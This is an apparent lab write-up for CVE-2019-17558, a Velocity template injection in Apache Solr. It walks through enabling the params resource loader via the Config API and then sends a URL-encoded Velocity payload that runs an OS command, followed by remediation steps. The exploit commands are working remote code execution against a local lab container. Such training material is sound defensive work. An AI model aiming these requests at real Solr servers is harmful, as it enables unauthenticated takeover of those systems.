# Apache Solr Velocity Template Injection RCE (CVE-2019-17558)

## Overview

CVE-2019-17558 is a high-severity Remote Code Execution vulnerability in Apache Solr versions 5.0.0 through 8.3.0. Solr is a popular enterprise search engine built on Apache Lucene.

The vulnerability stems from the `VelocityResponseWriter` component. Solr provides a Config API (`/solr/<core>/config`) that allows dynamic modification of core configurations without restarting the service. An attacker can enable the `params.resource.loader.enabled` property via the Config API. Once enabled, Solr allows custom Apache Velocity template expressions to be supplied directly via HTTP request parameters (`v.template`). Because Velocity allows invoking Java reflection methods on built-in tool objects, an attacker can execute arbitrary operating system commands on the Solr server without authentication.

- **Primary Interface**: `http://localhost:8130`
- **Docker Shortcut**: `./lab start solr-velocity`
- **Container Name**: `cyberlab_02_solr_velocity_ssti`
- **RAM Footprint**: ~400 MB

---

## Exploitation Walkthrough

### 1. Enabling the Velocity Custom Template Loader
Update the target core's configuration to allow custom templates:

```bash
# First identify the core name
CORE=$(curl -s http://localhost:8130/solr/admin/cores?indexInfo=false\&wt=json | jq -r '.status | keys[0]')
echo "Discovered Core: $CORE"

# Enable Velocity custom params loader
curl -s -X POST -H 'Content-Type: application/json' \
  "http://localhost:8130/solr/${CORE}/config" \
  -d '{
    "update-queryresponsewriter": {
      "startup": "lazy",
      "name": "velocity",
      "class": "solr.VelocityResponseWriter",
      "template.base.dir": "",
      "solr.resource.loader.enabled": "true",
      "params.resource.loader.enabled": "true"
    }
  }'
```

### 2. Executing Commands via Velocity Template Injection
Pass the Velocity template payload into the `select` query:

```bash
curl -s "http://localhost:8130/solr/${CORE}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3D%27%27)%23set(%24rt%3D%24x.class.forName(%27java.lang.Runtime%27))%23set(%24chr%3D%24x.class.forName(%27java.lang.Character%27))%23set(%24str%3D%24x.class.forName(%27java.lang.String%27))%23set(%24ex%3D%24rt.getRuntime().exec(%27id%27))%24ex.waitFor()%23set(%24out%3D%24ex.getInputStream())%23foreach(%24i+in+[1..%24out.available()])%24str.valueOf(%24chr.toChars(%24out.read()))%23end"
```

The command output (`uid=8983(solr) ...`) is rendered directly into the HTTP response.

---

## Defensive Remediation & Hardening

1. **Upgrade Apache Solr**:
   Upgrade to Apache Solr 8.4.0 or newer, which disables custom template loaders and restricts Velocity evaluation.
2. **Disable VelocityResponseWriter**:
   Remove `VelocityResponseWriter` from `solrconfig.xml` if HTML search preview features are not required.

---

## Video Walkthroughs & Technical References

- [Michael Stepankin - Apache Solr Injection - DEF CON 27 Conference](https://www.youtube.com/watch?v=xf2E64o4hWc)
- [Apache Solr Security Advisory](https://solr.apache.org/security.html)
- [Vulhub Solr Velocity Injection Advisory](https://vulhub.org/#/environments/solr/CVE-2019-17558/)
